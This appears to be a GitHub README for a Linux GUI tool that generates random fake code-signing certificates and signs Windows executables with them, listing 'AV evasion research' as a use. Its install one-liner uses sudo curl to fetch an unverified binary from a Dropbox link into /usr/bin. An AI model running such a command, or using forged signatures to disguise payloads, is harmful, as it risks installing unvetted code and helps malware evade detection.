<p align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Joker_black_02.svg/120px-Joker_black_02.svg.png" width="100" align="left"/>
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Joker_black_02.svg/120px-Joker_black_02.svg.png" width="100" align="right"/>
</p>

<h1 align="center">🃏 CertOfChaos</h1>

<p align="center">
  <i>"Why so serious about certificates?"</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Linux-39ff14?style=for-the-badge&logo=linux&logoColor=black"/>
  <img src="https://img.shields.io/badge/Version-2.0-9d00ff?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Made%20for-CTF%20%7C%20Labs-ff2052?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/License-MIT-ffcc00?style=for-the-badge"/>
</p>

<p align="center">
  A Joker-themed EXE code signing toolkit for Linux.<br/>
  Randomly generate fake code-signing certificates, sign PE binaries,<br/>
  batch-process folders, and verify signatures — all in one dark GUI.
</p>

<br/>

---

```
♠  Madness, as you know, is like gravity — all it takes is a little push.
♣  Introduce a little anarchy. Upset the established order of certificate chains.
♥  Why so serious? It's just a self-signed certificate.
♦  Some men just want to watch the trust store burn.
```

---

## ♠ Installation — One-liner (Kali / Debian / Ubuntu)

```bash
sudo apt install -y osslsigncode && sudo curl -L "https://www.dropbox.com/scl/fi/4142uewub1wgggyo6g9jx/CoC?rlkey=d0w62dxyzcfgogbsz8t4mcdwi&st=xu9avzx3&dl=1" -o /usr/bin/CertOfChaos && sudo chmod +x /usr/bin/CertOfChaos
```

> **What this does, step by step:**
>
> | Step | Command | Purpose |
> |------|---------|---------|
> | 1 | `apt install osslsigncode` | Installs the PE signing engine |
> | 2 | `curl -L ... -o /usr/bin/CertOfChaos` | Downloads the binary system-wide |
> | 3 | `chmod +x` | Makes it executable |

Then launch from anywhere:

```bash
CertOfChaos
```

---

## ♣ Run from Source

```bash
# Clone
git clone https://github.com/youruser/CertOfChaos
cd CertOfChaos

# Install dependency
pip install cryptography

# Run
python CertOfChaos.py
```

---

## ♥ Features

| | Feature | Description |
|---|---|---|
| 🃏 | **Random Cert Generation** | Generates a unique fake code-signing certificate on every run — randomized company name, country, org unit, and validity period |
| ✍️ | **Single EXE Signing** | Sign any PE binary in one click using a freshly generated self-signed cert |
| 📦 | **Batch Signing** | Queue multiple EXEs, set an output directory and suffix — optionally assign a new cert per file |
| 🔍 | **Built-in Verification** | Verify signatures right after signing with CA-aware self-signed cert validation via `-CAfile` |
| 💾 | **Certificate Export** | Export generated certs as `.pfx`, `.pem`, `.cer`, and private key `.pem` files |
| 🔒 | **Multi Hash Support** | SHA-256, SHA-384, SHA-512 |
| 🔑 | **RSA Key Sizes** | 2048-bit, 3072-bit, 4096-bit |
| ⏱️ | **Timestamp Servers** | DigiCert, Sectigo, GlobalSign, Comodo, Apple, FreeTSA |
| 📋 | **Preset Management** | Save, load, and delete certificate identity presets |
| 🎨 | **Joker UI Theme** | Acid green + deep purple palette, color-coded chaos log, Joker quotes on every cert roll |

---

## ♦ How It Works

```
┌─────────────────────────────────────────────────────────────────┐
│                        CertOfChaos                              │
│                                                                 │
│  1.  Generate self-signed X.509 cert  (cryptography library)    │
│              ↓                                                  │
│  2.  Serialize to .pfx  (PKCS#12, no password)                  │
│              ↓                                                  │
│  3.  Sign PE binary via osslsigncode                            │
│              ↓                                                  │
│  4.  Verify using -CAfile  (self-signed chain aware)            │
└─────────────────────────────────────────────────────────────────┘
```

Each generated certificate includes:

- `ExtendedKeyUsage: CodeSigning`
- `BasicConstraints: CA:TRUE`
- `KeyUsage: DigitalSignature, KeyCertSign, CRLSign`
- RFC3161 timestamp *(optional, via external TSA)*

---

## ♠ Use Cases (CTF & Lab)

- Sign payloads for **AV evasion research** in isolated lab VMs
- Test **Windows Authenticode** verification pipelines from Linux
- Simulate **supply chain signing** scenarios in CTF challenges
- Study **PE Authenticode structure** with custom-crafted certs
- Practice `osslsigncode` workflows on Kali / Parrot / Ubuntu

> ⚠️ **For authorized security research, CTF competitions, and lab environments only.**

---

## ♣ Dependencies

| Dependency | Purpose | Install |
|---|---|---|
| `osslsigncode` | PE Authenticode signing on Linux | `sudo apt install osslsigncode` |
| `cryptography` | X.509 cert + PKCS#12 generation | `pip install cryptography` *(source only)* |
| `tkinter` | GUI | Included in Python stdlib |

---

## ♥ Build Binary Yourself (PyInstaller)

```bash
pip install pyinstaller cryptography
pyinstaller --onefile --windowed --name CertOfChaos CertOfChaos.py
# Output → dist/CertOfChaos
```

---

## ♦ Project Structure

```
CertOfChaos/
├── CertOfChaos.py     ← Main application (source)
├── README.md
└── dist/
    └── CertOfChaos    ← PyInstaller binary (Linux x86_64)
```

---

## 🃏 Acknowledgements

- [osslsigncode](https://github.com/mtrojnar/osslsigncode) — cross-platform Authenticode signing engine
- [pyca/cryptography](https://github.com/pyca/cryptography) — X.509 and PKCS#12 handling
- The Joker, for the UI inspiration 🃏

---

<p align="center">
  <b>♠ ♣ &nbsp;&nbsp; CertOfChaos &nbsp;&nbsp; ♥ ♦</b><br/>
  <i>"Introduce a little anarchy. Upset the established order of certificate chains."</i>
</p>
